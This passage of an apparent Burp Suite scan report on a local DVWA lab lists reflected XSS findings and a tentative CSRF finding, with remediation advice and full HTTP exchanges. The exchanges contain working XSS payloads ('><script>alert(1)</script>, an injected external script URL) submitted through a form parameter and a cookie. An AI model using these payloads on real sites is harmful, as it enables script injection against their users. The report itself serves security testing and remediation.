<div class="rr_div"><span>GET /dvwa/vulnerabilities/captcha/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low; PHPSESSID=j01cbcc8o3ci68h8n3bccs4v9p<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:29:55 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Length: 4612<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Insecure CAPTCHA :: Damn Vulnerable Web Application (DVWA<br><b>...[SNIP]...</b><br>&lt;br /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<span class="HIGHLIGHT">&lt;script src='https://www.google.com/recaptcha/api.js'&gt;</span>&lt;/script&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH0" id="19">19.&nbsp;http://localhost:7878/dvwa/vulnerabilities/csp/</span>
<br><a class="PREVNEXT" href="#18">Previous</a>
&nbsp;<a class="PREVNEXT" href="#20">Next</a>
<br>
<span class="BODH1" id="19.1">19.1.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200300_crosssitescriptingreflected">Cross-site scripting (reflected)</a></span>
<br><a class="PREVNEXT" href="#18.6">Previous</a>
&nbsp;<a class="PREVNEXT" href="#19.2">Next</a>
<br>
<br><span class="TEXT">There are 5 instances of this issue:
<ul>
<li><a href="#19.1.1">/dvwa/vulnerabilities/csp/ [include parameter]</a></li>
<li><a href="#19.1.2">/dvwa/vulnerabilities/csp/ [include parameter]</a></li>
<li><a href="#19.1.3">/dvwa/vulnerabilities/csp/ [security cookie]</a></li>
<li><a href="#19.1.4">/dvwa/vulnerabilities/csp/ [security cookie]</a></li>
<li><a href="#19.1.5">/dvwa/vulnerabilities/csp/ [security cookie]</a></li>
</ul></span>
<h2>Issue background</h2>
<span class="TEXT"><p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>
<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>
<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>
<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>In most situations where user-controllable data is copied into application responses, cross-site scripting 
  attacks can be prevented using two layers of defenses:</p>
<ul>
  <li>Input should be validated as strictly as possible on arrival, given the kind of content that 
it is expected to contain. For example, personal names should consist of alphabetical 
and a small range of typographical characters, and be relatively short; a year of birth 
should consist of exactly four numerals; email addresses should match a well-defined 
regular expression. Input which fails the validation should be rejected, not sanitized.</li>
<li>User input should be HTML-encoded at any point where it is copied into 
application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be 
replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>
<p>In cases where the application's functionality allows users to author content using 
  a restricted subset of HTML tags and attributes (for example, blog comments which 
  allow limited formatting and linking), it is necessary to parse the supplied HTML to 
  validate that it does not use any dangerous syntax; this is a non-trivial task.</p></span>
<h2>References</h2>
<span class="TEXT"><ul>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting">Web Security Academy: Cross-site scripting</a></li>
	<li><a href="https://portswigger.net/web-security/cross-site-scripting/reflected">Web Security Academy: Reflected cross-site scripting</a></li>
	<li><a href="https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html">Using Burp to Find XSS issues</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/159.html">CWE-159: Failure to Sanitize Special Element</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/591.html">CAPEC-591: Reflected XSS</a></li>
</ul></span>
<br><br><div class="rule"></div>
<span class="BODH2" id="19.1.1">19.1.1.&nbsp;http://localhost:7878/dvwa/vulnerabilities/csp/ [include parameter]</span>
<br><a class="PREVNEXT" href="#14.4.4">Previous</a>
&nbsp;<a class="PREVNEXT" href="#19.1.2">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_firm_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Firm</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/csp/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>include</b> request parameter is copied into the response within the hostname of a URL from which JavaScript will be loaded. The payload <b>http://qewaegfyem</b> was submitted in the include parameter. This input was echoed unmodified within the "src" attribute of a "script" tag.<br><br>This proof-of-concept attack demonstrates that it is possible to modify the URL to reference an external host and so inject arbitrary JavaScript in the response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/csp/ HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; PHPSESSID=ju5kvrfifhsepnvvancgup7h1n<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/csp/<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 14<br><br>include=<span class="HIGHLIGHT">http%3a%2f%2fqewaegfyem</span></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:35:14 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;<br>Content-Length: 4157<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Content Security Policy (CSP) Bypass :: Damn Vulnerable W<br><b>...[SNIP]...</b><br>&lt;script src='<span class="HIGHLIGHT">http://qewaegfyem</span>'&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="19.1.2">19.1.2.&nbsp;http://localhost:7878/dvwa/vulnerabilities/csp/ [include parameter]</span>
<br><a class="PREVNEXT" href="#19.1.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#19.1.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_high_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>High</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/csp/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>include</b> request parameter is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>laip0'&gt;&lt;script&gt;alert(1)&lt;/script&gt;p1hvx</b> was submitted in the include parameter. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/csp/ HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; PHPSESSID=ju5kvrfifhsepnvvancgup7h1n<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/csp/<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 14<br><br>include=782731<span class="HIGHLIGHT">laip0'%3e%3cscript%3ealert(1)%3c%2fscript%3ep1hvx</span></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:35:10 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Content-Security-Policy: script-src 'self' https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;<br>Content-Length: 4183<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Content Security Policy (CSP) Bypass :: Damn Vulnerable W<br><b>...[SNIP]...</b><br>&lt;script src='782731<span class="HIGHLIGHT">laip0'&gt;&lt;script&gt;alert(1)&lt;/script&gt;p1hvx</span>'&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="19.1.3">19.1.3.&nbsp;http://localhost:7878/dvwa/vulnerabilities/csp/ [security cookie]</span>
<br><a class="PREVNEXT" href="#19.1.2">Previous</a>
&nbsp;<a class="PREVNEXT" href="#19.1.4">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_medium_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Medium</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/csp/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>ik8m8'&gt;&lt;script&gt;alert(1)&lt;/script&gt;hhugvsph518</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain "cookie-forcing" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/csp/?include=782731 HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">ik8m8'%3e%3cscript%3ealert(1)%3c%2fscript%3ehhugvsph518</span>; PHPSESSID=ju5kvrfifhsepnvvancgup7h1n<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/vulnerabilities/csp/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:35:15 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=ju5kvrfifhsepnvvancgup7h1n; path=/<br>Set-Cookie: security=low<br>Content-Security-Policy: script-src 'self';<br>Content-Length: 4339<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Content Security Policy (CSP) Bypass :: Damn Vulnerable W<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=csp&amp;security=low<span class="HIGHLIGHT">ik8m8'&gt;&lt;script&gt;alert(1)&lt;/script&gt;hhugvsph518</span>&amp;locale=en' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="19.1.4">19.1.4.&nbsp;http://localhost:7878/dvwa/vulnerabilities/csp/ [security cookie]</span>
<br><a class="PREVNEXT" href="#19.1.3">Previous</a>
&nbsp;<a class="PREVNEXT" href="#19.1.5">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_medium_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Medium</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/csp/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>qw1tq'&gt;&lt;script&gt;alert(1)&lt;/script&gt;a7ix6</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain "cookie-forcing" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/csp/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">qw1tq'%3e%3cscript%3ealert(1)%3c%2fscript%3ea7ix6</span>; PHPSESSID=543ht5nu5hoh3jmb1e0d5b9v27<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:15 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=543ht5nu5hoh3jmb1e0d5b9v27; path=/<br>Set-Cookie: security=low<br>Content-Security-Policy: script-src 'self';<br>Content-Length: 4327<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Content Security Policy (CSP) Bypass :: Damn Vulnerable W<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=csp&amp;security=low<span class="HIGHLIGHT">qw1tq'&gt;&lt;script&gt;alert(1)&lt;/script&gt;a7ix6</span>&amp;locale=en' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH2" id="19.1.5">19.1.5.&nbsp;http://localhost:7878/dvwa/vulnerabilities/csp/ [security cookie]</span>
<br><a class="PREVNEXT" href="#19.1.4">Previous</a>
&nbsp;<a class="PREVNEXT" href="#19.4.1">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_medium_certain_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Medium</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Certain</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/csp/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>qw1tq'&gt;&lt;script&gt;alert(1)&lt;/script&gt;a7ix6</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain "cookie-forcing" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.</span>
<h2>Request 1</h2>
<div class="rr_div"><span>GET /dvwa/vulnerabilities/csp/ HTTP/1.1<br>Host: localhost:7878<br>Cookie: security=low<span class="HIGHLIGHT">qw1tq'%3e%3cscript%3ealert(1)%3c%2fscript%3ea7ix6</span>; PHPSESSID=543ht5nu5hoh3jmb1e0d5b9v27<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://localhost:7878/dvwa/index.php<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br><br></span></div>
<h2>Response 1</h2>
<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Fri, 11 Mar 2022 07:33:15 GMT<br>Server: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.2<br>X-Powered-By: PHP/8.1.2<br>Expires: Tue, 23 Jun 2009 12:00:00 GMT<br>Cache-Control: no-cache, must-revalidate<br>Pragma: no-cache<br>Set-Cookie: PHPSESSID=543ht5nu5hoh3jmb1e0d5b9v27; path=/<br>Set-Cookie: security=low<br>Content-Security-Policy: script-src 'self';<br>Content-Length: 4327<br>Connection: close<br>Content-Type: text/html;charset=utf-8<br><br>&lt;!DOCTYPE html&gt;<br><br>&lt;html lang="en-GB"&gt;<br><br> &nbsp;&nbsp;&nbsp;&lt;head&gt;<br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /&gt;<br><br> &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&lt;title&gt;Vulnerability: Content Security Policy (CSP) Bypass :: Damn Vulnerable W<br><b>...[SNIP]...</b><br>&lt;input type="button" value="View Help" class="popup_button" id='help_button' data-help-url='../../vulnerabilities/view_help.php?id=csp&amp;security=low<span class="HIGHLIGHT">qw1tq'&gt;&lt;script&gt;alert(1)&lt;/script&gt;a7ix6</span>&amp;locale=en' )"&gt;<br><b>...[SNIP]...</b><br></span></div>
<div class="rule"></div>
<span class="BODH1" id="19.2">19.2.&nbsp;<a href="https://portswigger.net/knowledgebase/issues/details/00200700_crosssiterequestforgery">Cross-site request forgery</a></span>
<br><a class="PREVNEXT" href="#19.1">Previous</a>
&nbsp;<a class="PREVNEXT" href="#19.3">Next</a>
<br>
<h2>Summary</h2>
<table cellpadding="0" cellspacing="0" class="summary_table">
<tr>
<td rowspan="4" class="icon" valign="top" align="center"><div class='scan_issue_medium_tentative_rpt'></div></td>
<td>Severity:&nbsp;&nbsp;</td>
<td><b>Medium</b></td>
</tr>
<tr>
<td>Confidence:&nbsp;&nbsp;</td>
<td><b>Tentative</b></td>
</tr>
<tr>
<td>Host:&nbsp;&nbsp;</td>
<td><b>http://localhost:7878</b></td>
</tr>
<tr>
<td>Path:&nbsp;&nbsp;</td>
<td><b>/dvwa/vulnerabilities/csp/</b></td>
</tr>
</table>
<h2>Issue detail</h2>
<span class="TEXT">The request appears to be vulnerable to cross-site request forgery (CSRF) attacks against authenticated users.</span>
<h2>Issue background</h2>
<span class="TEXT"><p>Cross-site request forgery (CSRF) vulnerabilities may arise when applications rely solely on HTTP cookies to identify the user that has issued a particular request. Because browsers automatically add cookies to requests regardless of their origin, it may be possible for an attacker to create a malicious web site that forges a cross-domain request to the vulnerable application. For a request to be vulnerable to CSRF, the following conditions must hold:</p>
<ul>
<li>The request can be issued cross-domain, for example using an HTML form. If the request contains non-standard headers or body content, then it may only be issuable from a page that originated on the same domain.</li>
<li>The application relies solely on HTTP cookies or Basic Authentication to identify the user that issued the request. If the application places session-related tokens elsewhere within the request, then it may not be vulnerable.</li>
<li>The request performs some privileged action within the application, which modifies the application's state based on the identity of the issuing user.</li><li>The attacker can determine all the parameters required to construct a request that performs the action. If the request contains any values that the attacker cannot determine or predict, then it is not vulnerable.</li></ul></span>
<h2>Issue remediation</h2>
<span class="TEXT"><p>The most effective way to protect against CSRF vulnerabilities is to include within relevant requests an additional token that is not transmitted in a cookie: for example, a parameter in a hidden form field. This additional token should contain sufficient entropy, and be generated using a cryptographic random number generator, such that it is not feasible for an attacker to determine or predict the value of any token that was issued to another user. The token should be associated with the user's session, and the application should validate that the correct token is received before performing any action resulting from the request.</p>
<p>An alternative approach, which may be easier to implement, is to validate that Host and Referer headers in relevant requests are both present and contain the same domain name. However, this approach is somewhat less robust: historically, quirks in browsers and plugins have often enabled attackers to forge cross-domain requests that manipulate these headers to bypass such defenses. </p></span>
<h2>References</h2>
<span class="TEXT"><ul>
    <li><a href="https://portswigger.net/web-security/csrf">Web Security Academy: Cross-site request forgery</a></li>
    <li><a href="https://support.portswigger.net/customer/portal/articles/1965674-using-burp-to-test-for-cross-site-request-forgery-csrf-">Using Burp to Test for Cross-Site Request Forgery</a></li>
    <li><a href="https://media.blackhat.com/eu-13/briefings/Lundeen/bh-eu-13-deputies-still-confused-lundeen-wp.pdf">The Deputies Are Still Confused</a></li>
</ul></span>
<h2>Vulnerability classifications</h2><span class="TEXT"><ul>
<li><a href="https://cwe.mitre.org/data/definitions/352.html">CWE-352: Cross-Site Request Forgery (CSRF)</a></li>
    <li><a href="https://capec.mitre.org/data/definitions/62.html">CAPEC-62: Cross Site Request Forgery</a></li>
</ul></span>
<h2>Request 1</h2>
<div class="rr_div"><span>POST /dvwa/vulnerabilities/csp/ HTTP/1.1<br>Host: localhost:7878<br>Origin: http://localhost:7878<br>Cookie: security=low; PHPSESSID=oov5nsllfk2e7bf6ikmnqv3s8i<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Upgrade-Insecure-Requests: 1<br>Referer: http://<span class="HIGHLIGHT">localhost</span>:7878/dvwa/vulnerabilities/csp/<br>Content-Type: application/x-www-form-urlencoded<br>Accept-Encoding: gzip, deflate<br>Accept-Language: en-US,en-GB;q=0.9,en;q=0.8<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36<br>Connection: close<br>Cache-Control: max-age=0<br>Content-Length: 14<br><br>include=299223</span></div>
<h2>Response 1</h2>
